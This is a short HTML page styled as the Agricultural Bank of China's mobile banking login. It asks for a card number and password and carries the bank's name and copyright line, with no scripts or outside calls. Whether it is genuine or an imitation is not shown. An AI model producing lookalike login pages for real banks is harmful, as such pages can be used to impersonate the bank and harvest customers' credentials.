<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><title>中国农业银行-掌上银行登录</title>
<style>body{margin:0;font-family:"Microsoft YaHei",Arial,sans-serif;background:#f1f7f2;color:#333}
header{background:#00793b;color:#fff;padding:16px 40px;display:flex;align-items:center;gap:24px}
.logo{font-size:24px;font-weight:700;letter-spacing:2px}
.card{margin:36px auto;width:420px;background:#fff;border-radius:8px;padding:32px;box-shadow:0 2px 10px #0001}
.card h2{margin:0 0 6px;font-size:20px;color:#00793b}.card p{margin:0 0 16px;font-size:13px;color:#999}
label{display:block;font-size:13px;color:#555;margin:12px 0 6px}
input{width:100%;height:40px;border:1px solid #ccd;border-radius:6px;padding:0 10px;font-size:14px;box-sizing:border-box}
button{width:100%;height:42px;margin-top:18px;background:#00793b;color:#fff;border:none;border-radius:6px;font-size:15px;cursor:pointer}
footer{padding:20px;text-align:center;color:#999;font-size:12px}</style></head>
<body><header><span class="logo">中国农业银行</span><span>掌上银行</span></header>
<div class="card"><h2>掌上银行登录</h2><p>请输入卡号与密码</p>
<form action="/mobile/login" method="post">
<label>银行卡号</label><input placeholder="请输入卡号">
<label>登录密码</label><input type="password" placeholder="请输入密码">
<button type="submit">登录</button></form></div>
<footer>© 中国农业银行股份有限公司</footer></body></html>
